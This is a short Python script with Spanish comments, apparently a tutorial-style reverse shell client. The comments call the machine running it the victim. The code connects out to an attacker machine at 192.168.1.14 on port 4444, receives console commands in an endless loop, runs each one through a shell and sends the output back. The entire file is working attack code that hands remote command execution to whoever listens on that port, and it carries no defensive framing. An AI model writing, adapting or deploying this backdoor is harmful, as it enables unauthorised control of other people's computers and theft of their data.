import socket
import subprocess

def runCommand(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    connection.connect((b'192.168.1.14', 4444)) #La víctima establece conexión con la computadora atacante
    
    while True: #Permite al programa ejecutarse indefinidamente
        command = connection.recv(1024) #Recibe toda la información que le enviemos(En este caso, comandos de consola)
        commandResults = runCommand(command)
        connection.send(commandResults)

except KeyboardInterrupt:
    connection.send(b'El cliente ha finalizado la conexion')
    connection.close()
    print('\nConexión finalizada')